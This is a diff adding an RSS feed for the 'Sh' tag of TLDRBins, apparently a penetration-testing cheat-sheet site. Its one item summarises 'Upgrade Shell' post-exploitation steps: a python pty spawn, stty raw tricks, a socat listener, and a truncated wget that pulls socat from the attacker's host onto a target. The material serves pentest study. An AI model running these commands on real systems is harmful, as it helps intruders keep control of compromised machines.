@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Sh on TLDRBins</title>
+    <link>https://tldrbins.github.io/@sh/</link>
+    <description>Recent content in Sh on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@sh/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Upgrade Shell</title>
+      <link>https://tldrbins.github.io/upgrade_shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/upgrade_shell/</guid>
+      <description>Upgrade Shell Check installed binary which sh which bash which python3 which python python python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color socat Download socat&#xA;# Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.</description>
+    </item>
+  </channel>
+</rss>
